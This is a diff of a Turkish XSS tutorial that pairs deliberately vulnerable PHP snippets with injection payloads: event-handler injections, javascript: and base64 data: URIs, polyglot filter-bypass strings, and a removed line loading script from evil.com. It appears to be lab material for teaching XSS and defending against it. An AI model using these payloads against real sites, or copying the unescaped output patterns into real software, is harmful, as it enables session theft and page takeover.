@@ -25,19 +25,25 @@ cover:
 
 [Test ortamı](http://35.187.63.168/task2/event-handlers/index.php)
 
-Event handler'lar, HTML elementleri üzerinde çeşitli olayları (event) yakalayan ve yanıt veren JavaScript kodlarıdır. En yaygın event handler'lar şunlardır:<br>
-
-- onclick: Bir öğeye tıklanıldığında çalışır.<br>
-- onload: Bir öğe yüklendiğinde çalışır.<br>
-- onerror: Bir hata oluştuğunda çalışır.<br>
-- onfocus: Bir öğe odaklandığında çalışır.<br>
-- onchange: Bir öğe değiştirildiğinde çalışır.<br>
+Event handler'lar, HTML elementleri üzerinde çeşitli olayları (event) yakalayan ve yanıt veren JavaScript kodlarıdır. En yaygın event handler'lar şunlardır:
+<br>
+- `onclick`: Bir öğeye tıklanıldığında çalışır.
+<br>
+- `onload`: Bir öğe yüklendiğinde çalışır.
+<br>
+- `onerror`: Bir hata oluştuğunda çalışır.
+<br>
+- `onfocus`: Bir öğe odaklandığında çalışır.
+<br>
+- `onchange`: Bir öğe değiştirildiğinde çalışır.
+<br>
+- `onplay`: Medya öğesi oynarken tetiklenir.
 
 Event handler'lar, kötü niyetli kodların web sayfasında çalıştırılmasına olanak tanıyabilir, bu da XSS saldırılarının uygulanmasına neden olabilir.
 
 Örneklerle inceleyelim.
 
-### img tag ve onerror event:
+### img tag & onerror event:
 
 ```php
 $decoded = urldecode($userInput);
@@ -49,7 +55,7 @@ echo "<img src=\"" . $decoded . "\">";
 `%2522` iki kez encode edilmiş `"` karakteridir. İlk encode işleminde `%22` olur, ikinci encode işleminde `%2522` olur.
 Çalışma: `onerror eventi`, resim yüklenemezse tetiklenir. Kullanıcı `img` etiketi için URL olarak `%2522%2520onerror=%2522alert()` gibi bir değer girerse, bu değer iki kez decode edilerek `"%20onerror="alert()` olur. Bu, `onerror eventini` tetikler ve `alert('XSS')` çalıştırır.
 
-### svg tag ve onload event:
+### svg tag & onload event:
 
 ```php
 $replaced = str_replace(">", "&gt;", $userInput);
@@ -63,7 +69,7 @@ echo "<svg height=\"" . $replaced . "\" width=\"100\" xmlns=\"http://www.w3.org/
 Encode: `%22` karakteri `"` ile aynı şeydir, `+onload=%22alert()` kısmı ise `onload eventine` alert`('XSS')` atar.
 Çalışma: Kullanıcı `SVG` etiketinin height özelliğine `%22+onload=%22alert()` gibi bir değer girerse, bu değer HTML encode edilmez ve `onload eventi` tetiklenir, `alert('XSS')` çalıştırılır.
 
-### Double Encode Edilmiş Payload ve onloadstart
+### Double Encoded Payload & onloadstart
 
 ```php
 $ddecoded = urldecode(urldecode($userInput));
@@ -75,7 +81,7 @@ echo "<video src=\"" . $ddecoded . "\" autoplay></video>";
 Çift URL Encode: `%2522` iki kez URL encode edilmiştir. İlk decode işlemi `%22` sonucunu verir, ikinci decode işlemi ise `"` karakterini geri getirir.
 Çalışma: Video etiketine çift encode edilmiş payload girildiğinde, bu payload iki kez decode edilerek `onloadstart="alert()` olur. `onloadstart eventi` tetiklenir ve `alert('XSS')` çalıştırılır.
 
-### audio tag ve onplay event:
+### audio tag & onplay event:
 
 ```php
 echo "<audio src=\"" . $userInput . "\" autoplay></audio>";
@@ -86,7 +92,7 @@ echo "<audio src=\"" . $userInput . "\" autoplay></audio>";
 Payload: Burada `onplay eventi`, `audio` etiketine eklenecek bir JavaScript kodu içerir.
 Çalışma: Kullanıcı audio etiketinin `src` özelliğine `sound.mp3" onplay="alert()` gibi bir değer girerse, `onplay event` tetiklenir ve `alert('XSS')` çalıştırılır.
 
-### a tag ve onfocus event:
+### a tag & onfocus event:
 
 ```php
 echo "<a href=\"" . $userInput . "\" autofocus>Link</a>";
@@ -97,7 +103,7 @@ echo "<a href=\"" . $userInput . "\" autofocus>Link</a>";
 Payload: `onfocus eventine` JavaScript kodu atanmıştır.
 Çalışma: Kullanıcı `a` etiketinin `href` özelliğine `"+onfocus="javascript:alert()` gibi bir değer girerse, `onfocus eventi` tetiklenir ve `javascript:alert('XSS')` çalıştırılır.
 
-### button tag ve onclick event (Base64 Encoded):
+### button tag & onclick event (Base64 Encoded):
 
 ```php
 $replaced2 = str_replace("\"", "", $userInput);
@@ -109,7 +115,7 @@ echo "<button type=\"submit\" formaction=\"" . base64_decode($replaced2) . "\">C
 Base64 Encode: `IiBvbmNsaWNrPSJhbGVydCgp` base64 encode edilmiş `onclick="alert()"` kodunu temsil eder.
 Çalışma: Kullanıcı button etiketinin `formaction` özelliğine base64 encode edilmiş payload girerse, bu değer base64 decode edilerek `onclick="alert()" `olur. `onclick event` tetiklenir ve `alert('XSS')` çalıştırılır.
 
-### input tag ve onchange event:
+### input tag & onchange event:
 
 ```php
 echo "<input type=\"text\" placeholder=\"" . $userInput . "\" />";
@@ -129,25 +135,66 @@ Encode: `%22` karakteri `"` ile aynı şeydir, `+onchange=%22alert()` kısmı is
 
 Web uygulamalarında güvenlik açıkları, çeşitli yollarla ortaya çıkabilir ve URI (Uniform Resource Identifier) şemaları bu açıdan önemli bir riski temsil eder. URI şemaları, bir URL'nin protokol kısmını belirleyerek çeşitli türde kaynaklara erişim sağlar. Ancak, URI şemaları kötü niyetli kullanıcılar tarafından XSS saldırıları için kullanılabilir. Burada, URI şemalarının nasıl XSS saldırılarına neden olabileceğini ve belirli örnekler üzerinden bu zaafiyetlerin nasıl tetiklendiğini inceleyeceğiz.
 
-### img tag ile javascript: URI Scheme
+### iframe tag ile javascript: URI Scheme
 
-```html
-<img src="$userInput" />
+```php
+<iframe src=\"" . $userInput . "\"></iframe>
 ```
 
 **Paylaod**
 
 ```
-x" onerror="javascript:alert('xss')
+javascript:alert(0)
 ```
 
-**Nasıl Çalışır:** img tag'ında onerror olayı kullanılarak JavaScript kodu çalıştırılır. src özniteliğinde geçerli bir URL olmadığı için onerror olayı tetiklenir ve JavaScript kodu çalışır.
+**Nasıl Çalışır:** `src` özniteliği javascript protokolünü adres olarak tanır, frame açmaya çalışınca ve alert tetiklenir.
 
-**Zaafiyet:** JavaScript kodları onerror olayında çalıştırılabilir, bu da XSS'e yol açar.
+### iframe tag ile data:text URI Scheme
+
+```php
+<iframe src=\"" . $userInput . "\"></iframe>
+```
+
+**Paylaod**
+
+```
+data:text/html;base64,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==
+```
+
+**Nasıl Çalışır:** `src` özniteliği data protokolünü adres olarak tanır, frame açmaya çalışınca ve base64 içinde yazan payload tetiklenir.
+
+### iframe tag ile data:image URI Scheme
+
+```php
+<iframe src=\"" . $userInput . "\"></iframe>
+```
+
+**Paylaod**
+
+```
+data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+
+```
+
+**Nasıl Çalışır:** `src` özniteliği data protokolünü adres olarak tanır, frame açmaya çalışınca ve base64 içinde yazan payload tetiklenir.
+
 
 ### embed tag ile javascript: URI Scheme
 
-```html
+```php
+<embed src="$userInput"></embed>
+```
+
+**Paylaod**
+
+```
+data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+
+```
+
+**Nasıl Çalışır:** embed tag'ı kullanılarak base64 kodlanmış HTML içeriği yüklenir. Bu içerikte JavaScript kodları çalıştırılabilir. Fitreleme olmadığı için xss saldırısına yol açar. 
+
+### embed tag ile data:image URI Scheme
+
+```php
 <embed src="$userInput"></embed>
 ```
 
@@ -157,46 +204,50 @@ x" onerror="javascript:alert('xss')
 data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
 ```
 
-**Nasıl Çalışır:** embed tag'ı kullanılarak base64 kodlanmış HTML içeriği yüklenir. Bu içerikte JavaScript kodları olabilir ve çalıştırılabilir.
+**Nasıl Çalışır:** embed tag'ı kullanılarak base64 kodlanmış HTML içeriği yüklenir. Bu içerikte JavaScript kodları çalıştırılabilir. Fitreleme olmadığı için xss saldırısına yol açar.
 
-**Zaafiyet:** Base64 kodlanmış veri filtrelenmediği için XSS saldırılarında kullanılabilir.
+### embed tag ile data:text URI Scheme
 
-### embed tag ile data: URI Scheme
-
-```html
+```php
 <embed src="$userInput"></embed>
 ```
 
 **Paylaod**
 
-```js
-data:text/html;base64,amF2YXNjcmlwdDphbGVydCgp" onload="eval(atob(this.src.split(',')[1]))
+```
+data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
 ```
 
-**Nasıl Çalışır:** data: URI scheme, URL'nin veri kısmını doğrudan içerir. Base64 ile kodlanmış veri, tarayıcı tarafından işlenir ve içeriği decode eder. Base64 ile kodlanmış içerik şu şekilde dekode edilir:
-`amF2YXNjcmlwdDphbGVydCgp` — `<script>alert()</script>`
+**Nasıl Çalışır:** embed tag'ı kullanılarak base64 kodlanmış HTML içeriği yüklenir. Bu içerikte JavaScript kodları çalıştırılabilir. Fitreleme olmadığı için xss saldırısına yol açar.
 
-**onload event:** onload event, embed etiketi yüklendiğinde tetiklenir. Bu event, `eval(atob(this.src.split(',')[1]))` kodunu çalıştırır.
+### object tag ile javascript: URI Scheme
 
-**atob() Fonksiyonu:** Bu fonksiyon base64 kodlu veriyi decode eder. `this.src.split(',')[1]` ifadesi, data: URI şeması içindeki base64 kodunu alır.
+```php
+<object data=\"". $userInput . "\"></object>
+```
 
-**eval() Fonksiyonu:** Decode edilen veriyi JavaScript kodu olarak çalıştırır. Bu, kötü niyetli JavaScript kodlarının yürütülmesine neden olur.
+**Paylaod**
+
+```
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+```
+
+**Nasıl Çalışır:** object tag'ı kullanılarak base64 kodlanmış HTML içeriği yüklenir. Bu içerikte JavaScript kodları çalıştırılabilir. Fitreleme olmadığı için xss saldırısına yol açar.
+
 
 ### a href ile javascript: URI Scheme
 
-```html
-<a href="$userInput">LINK</a>
+```php
+<a href=\"" . $userInput . "\">LINK</a>
 ```
 
 **Paylaod**
 
 ```js
-javascript: alert("xss");
+javascript:alert(0);
 ```
 
 **Nasıl Çalışır:** javascript: URI şeması, JavaScript kodlarını çalıştırmak için kullanılır. Bu kodlar linke tıklanmasıyla çalıştırılabilir.
-
-**Zaafiyet:** JavaScript kodlarının doğrudan çalıştırılmasına izin veren URI şemaları filtrelenmediği için XSS'e sebep olur.
 
 Sonuç olarak URI şemaları, XSS saldırılarına karşı hassas bir alan olabilir. Kullanıcı girdi verilerini doğru şekilde işlemek, filtrelemek ve kodlamak, XSS risklerini minimize etmek için kritik öneme sahiptir.
 
@@ -360,26 +411,30 @@ Bu örneklerde, kodlar farklı encoding türlerini kullanarak kullanıcı girdil
 
 [Test ortamı](http://35.187.63.168/task2/polyglot/index.php)
 
-PHP ile yazılmış bir web uygulamasında Polyglot XSS saldırılarını inceleyeceğiz. Polyglot XSS, farklı XSS vektörlerini birleştirerek birden çok güvenlik katmanını atlatmayı amaçlayan bir saldırı türüdür. Aşağıda verilen kodlar, çeşitli filtreleme fonksiyonları kullanarak kullanıcı girdilerini işlemek için tasarlanmıştır. Ancak, bu kodun belirli zafiyetlere sahip olup olmadığını ve bu zafiyetlerin nasıl kullanılabileceğini göreceğiz.
+PHP ile yazılmış bir web uygulamasında Polyglot XSS saldırılarını inceleyeceğiz. Polyglot XSS attack, farklı XSS vektörlerini birleştirerek birden çok güvenlik katmanını atlatmayı amaçlayan bir saldırı türüdür. Aşağıda verilen kodlar, çeşitli filtreleme fonksiyonları kullanarak kullanıcı girdilerini işlemek için tasarlanmıştır. Bu kodun belirli zafiyetlere sahip olup olmadığını ve bu zafiyetlerin nasıl kullanılabileceğini göreceğiz.
 
 ### Test Case 1
 
 ```php
-function filter($input) {
-  $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
-  $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
-  $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
-  $filtered = str_replace(['javascript:', 'expression('], '', $filtered);
-  $filtered = str_replace(['iframe', 'eval', 'onload', 'img', 'onclick'], '', $filtered);
-  return $filtered;
-}
-function unsafeEcho($str) {
-  echo filter($str);
-}
-echo "<p>1 " .  unsafeEcho($userInput) . "</p>";
+<?php
+  $userInput = isset($_GET['input']) ? $_GET['input'] : '';
+
+  function filter1($input) {
+    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
+    $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
+    $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
+    $filtered = str_replace(['javascript:', 'expression('], '', $filtered);
+    $filtered = str_replace(['iframe', 'eval', 'onload', 'img', 'onclick', 'onmouseout', 'ondblclick'], '', $filtered);
+    return $filtered;
+  }
+  function echo1($str) {
+    echo filter1($str);
+  }
+    echo "<p>" .  htmlspecialchars(echo1($userInput)) . "</p>";
+?>
 ```
 
-**Zafiyet:** filter fonksiyonu çeşitli tehlikeli etiketleri ve olayları kaldırsa da, "<\img>" ve "onmouseover" gibi bazı önemli XSS vektörlerini yeterince engellemez. Ayrıca, kullanıcı girdisi doğrudan ekrana yazdırılırken HTML özel karakterleri encode edilmez, bu da XSS saldırılarına açık bir durum yaratır.
+**Zafiyet:** filter fonksiyonu çeşitli tehlikeli etiketleri ve olayları kaldırsa da, `svg` ve `onmouseover` gibi bazı önemli XSS vektörlerini yeterince engellemez. Ayrıca, kullanıcı girdisi doğrudan ekrana yazdırılırken HTML özel karakterleri encode edilmez, bu da XSS saldırılarına açık bir durum yaratır.
 
 **Yukarıdaki kodu bypass edecek bir payload**
 
@@ -390,98 +445,142 @@ javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></st
 ### Test Case 2
 
 ```php
-function filter($input) {
-  $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
-  $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
-  $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
-  $filtered = str_replace(['javascript:', 'expression('], '', $filtered);
-  $filtered = str_replace(['iframe', 'eval', 'onmouseover', 'img', 'textarea', 'onclick'], '', $filtered);
-  return $filtered;
-}
-function unsafeEcho($str) {
-  echo filter($str);
-}
-echo "<p>2 " .  htmlspecialchars(unsafeEcho($userInput), ENT_QUOTES) . "</p>";
+<?php
+  $userInput = isset($_GET['input']) ? $_GET['input'] : '';
+
+  function filter2($input) {
+    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
+    $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
+    $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
+    $filtered = str_replace(['javascript:', 'expression('], '', $filtered);
+    $filtered = str_replace(['iframe', 'eval', 'onclick', 'onmouseover', 'img', 'textarea', 'onclick',  'onmouseout', 'ondblclick'], '', $filtered);
+    return $filtered;
+  }
+    echo "<script>var str =\" " .  filter2($userInput) . "\";</script>";
+?>
 ```
 
-**Filtreleme:** filter fonksiyonu, onmouseover ve textarea gibi ek XSS vektörlerini de kaldırır. Ayrıca, unsafeEcho fonksiyonu ile çıktı HTML özel karakterleri encode edilir.
+**Filtreleme:** filter fonksiyonu, `onmouseover` ve `textarea` gibi ek XSS vektörlerini de kaldırır. Ayrıca, unsafeEcho fonksiyonu ile çıktı HTML özel karakterleri encode edilir.
 
-**Zaafiyet:** Bu örnekte diğer örnekten farklı olarak "onload" gibi vektörler yeterince filtrelemeyebilir.
+**Zaafiyet:** Bu örnekte diğer örnekten farklı olarak `onload` gibi vektörler yeterince filtrelemeyebilir.
 
 **Yukarıdaki kodu bypass edecek bir payload**
 
 ```html
-javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><frame/onload=alert()--><<svg/*/ onload=alert()//>
+javascript:/*"/*`/*'/*\"/*</script></style></template></select></title></textarea></noscript></noembed><<svg/*/ onload=alert()//>
 ```
 
 ### Test Case 3
 
 ```php
-function filter($input) {
-  $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
-  $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
-  $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
-  $filtered = str_replace(['expression('], '', $filtered);
-  $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover'], '', $filtered);
-  return $filtered;
-}
-function unsafeEcho($str) {
-  echo filter($str);
-}
-echo "<p>3 " . unsafeEcho($userInput) . "</p>";
+<?php
+  $userInput = isset($_GET['input']) ? $_GET['input'] : '';
+
+  function filter3($input) {
+    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
+    $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
+    $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
+    $filtered = str_replace(['expression('], '', $filtered);
+    $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover', 'onmouseout', 'ondblclick', 'onclick'], '', $filtered);
+    return $filtered;
+  }
+  echo "<input type='text' placeholder='input a text' value='" . filter3($userInput) . "'>";
+?>
 ```
 
-**Filtreleme:** filter fonksiyonu, onload ve onmouseover gibi ek XSS vektörlerini de kaldırır. Ancak, hala bazı zafiyetler olabilir.
+**Filtreleme:** filter fonksiyonu, `onload` ve `onmouseover` gibi ek XSS vektörlerini de kaldırır. Ancak, hala bazı zafiyetler bulundurmaktadır.
 
 **Zaafiyet:** Bu fonksiyon, belirli URI şemalarını (örneğin javascript:) ve HTML etiketlerini filtrelerken yeterince kapsamlı olmayabilir.
 
 **Yukarıdaki kodu bypass edecek bir payload**
 
 ```html
-javascript:/*"/*'/*`/*\"/**/ alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>--><<svg style="border:1px solid black" onclick=javascript:alert()><frame src=javascript:alert()>
+javascript:/*"/*'/*`/*\"/**/ oninput=alert()//*</title></textarea></style></noscript></noembed></template></option></select></SCRIPT>-->
+```
+
+### Test Case 4
+
+```php
+<?php
+  $userInput = isset($_GET['input']) ? $_GET['input'] : '';
+
+  function filter4($input) {
+    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
+    $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
+    $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
+    $filtered = str_replace(['expression('], '', $filtered);
+    $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover', 'ondblclick'], '', $filtered);
+    return $filtered;
+  }
+  echo "<a href=\"" . filter4($userInput) . "\">set link</a>";
+?>
+```
+
+**Yukarıdaki kodu bypass edecek bir payload**
+
+```html
+jaVasCript:/*-/*`/*\`/*'/*"/*/(/* */ onclick=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3ciframe/<iframe///>\x3e
+```
+
+### Test Case 5
+
+```php
+<?php
+  $userInput = isset($_GET['input']) ? $_GET['input'] : '';
+
+  function filter5($input) {
+    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
+    $filtered = preg_replace('/on\w+\s*=\s*"(?:.|\n)*?"/i', '', $filtered);
+    $filtered = preg_replace('/data:\s*[^\s]*?base64[^\s]*/i', '', $filtered);
+    $filtered = str_replace(['expression('], '', $filtered);
+    $filtered = str_replace(['iframe', 'eval', 'onload', 'onmouseover', 'onclick'], '', $filtered);
+    return $filtered;
+  }
+  echo "add comment line";
+  echo "<!--" . filter5($userInput) . "-->";
+?>
+```
+
+**Yukarıdaki kodu bypass edecek bir payload**
+
+```html
+jaVasCript:/*-/*`/*\`/*'/*"/*%0D%0A%0d%0a*/(/* */)//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/ondblclick=alert()//>
 ```
 
 Sonuç olarak Polyglot XSS saldırıları, çeşitli XSS vektörlerini birleştirerek birçok filtreleme katmanını atlatmayı hedefler. Yukarıdaki PHP kodları, farklı filtreleme fonksiyonları kullanarak kullanıcı girdilerini işlemek için tasarlanmıştır. Ancak, her kodun kendine özgü zafiyetleri olma ihtimali gözden kaçırılmamalıdır.
 
 ---
 
-# Noscript XSS Attack
+# Noscript XSS Filter ByPass & Attack
 
-[Test ortamı](http://35.187.63.168/task2/noscript/index.php)
+NoScript XSS saldırıları, JavaScript'in devre dışı bırakıldığı, çalışmadığı veya filtrelendiği durumlarda XSS açıklarını kullanmayı amaçlayan saldırılardır. JavaScript'in esnek doğası, yanlış kullanıldığında ciddi güvenlik açıklarına yol açabilir. Bu yazıda, \_\_defineSetter__ yönteminin XSS zafiyetine nasıl neden olabileceğini inceleyeceğiz.
 
-NoScript XSS saldırıları, JavaScript'in devre dışı bırakıldığı, çalışmadığı veya filtrelendiği durumlarda XSS açıklarını kullanmayı amaçlayan saldırılardır. Bu tür saldırılar, JavaScript'i engelleyen güvenlik önlemlerinin etrafından dolanmak için HTML ve CSS gibi diğer web teknolojilerini kullanır. Hedef, tarayıcıda JavaScript çalıştırılamasa bile zararlı içeriklerin gösterilmesini sağlamaktır.
+### \_\_defineSetter__ Nedir?
+\_\_defineSetter__ JavaScript'te bir nesnenin özelliğini bir fonksiyona bağlamayı sağlar. Özellik ayarlandığında belirlenen fonksiyon çalışır.
 
-### Test Case
-
-```php
-<?php
-  function filter($input) {
-    $filtered = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', "", $input);
-    $filtered = str_replace(['iframe', 'eval', 'onmouseover', 'img', 'textarea', 'onclick', 'svg', 'onload', 'onerror', 'script', 'a'], '', $filtered);
-    return $filtered;
-  }
-  $userInput = filter(isset($_GET['message']) ? $_GET['message'] : '');
-  echo $userInput;
-?>
+### Genel Kullanım Örneği
+```javascript
+let obj = {};
+obj.__defineSetter__('prop', function(value) {
+    console.log('prop set to ' + value);
+});
+obj.prop = 123;// Konsolda "prop set to 123" mesajı görüntülenmesi beklenir
 ```
 
-Back-end tarafında bazı filtrelemeler gerçekleştiği için doğrudan JavaScript çalıştıracak bir payload kullanamıyoruz. Bu durumda filtreyi bypass edecek yöntemlere ihtiyacımız var. Burada diğer HTML elementlerinden yararlanabiliriz. Örnek olarak "link" elementi url ile kaynak import etmeyi sağlıyor. Zararlı bir JS, CSS, favicon vs. çağırarak zararlı kod veya dosya çalıştırabiliriz.
+### \_\_defineSetter__ ile XSS Saldırısı
+PortSwigger araştırmacılarından Gareth Heyes'in [NoScript XSS filter bypass](https://portswigger.net/research/noscript-xss-filter-bypass) araştırmasında, \_\_defineSetter__ yönteminin XSS filtrelerini nasıl atlatabileceğini göstermektedir. Saldırgan, window nesnesinde bir setter tanımlanarak ve bu özellik ayarlandığında zararlı kod çalıştırarak XSS filtrelerini atlatabilir.
 
-Aşağıdaki payload zararlı JavaScript dosyası çağırır ve çalıştırır.
-
-```html
-<link rel="stylesheet" href="http://evil.com/malicious.js" />
+### Saldırı Örneği
+```javascript
+<script> x = ''.__defineSetter__('x', alert), x = 1, '';</script>
 ```
+- `x` ilk olarak boş bir string olarak atanıyor.
+- `__defineSetter__('x',alert)` ile x özelliğine setter atanıyor.
+- `x = 1` satırı çalıştığında, x'in değeri değiştiriliyor ve bu değişim `alert` fonksiyonunu tetikliyor.
 
-Bu paylaod ise zararlı CSS dosyası çağırır ve çalıştırır.
+Modern tarayıclar bu yöntemleri engellese de buna benzer saldırı yüzeyleri bir yerlerde var olmaya ve keşfedilmeye devam edecektir.
 
-```html
-<link rel="stylesheet" href="http://evil.com/malicious.css" />
-
-CSS içeriği : @import 'javascript:alert("XSS")';
-```
-
-NoScript XSS saldırıları, JavaScript devre dışı bırakıldığında bile XSS açıklarından yararlanmayı hedefler. Yukarıdaki PHP kodu, kullanıcı girdilerini filtrelemeye çalışsa da, CSS ve HTML tabanlı XSS saldırılarına karşı yeterli koruma sağlamayabilir. Güvenli bir uygulama geliştirmek için, tüm kullanıcı girdilerini dikkatlice işlemek, HTML ve CSS içeriğini encode etmek ve etkili bir CSP kullanmak önemlidir.
+---
 
 # Blind XSS Attack
 
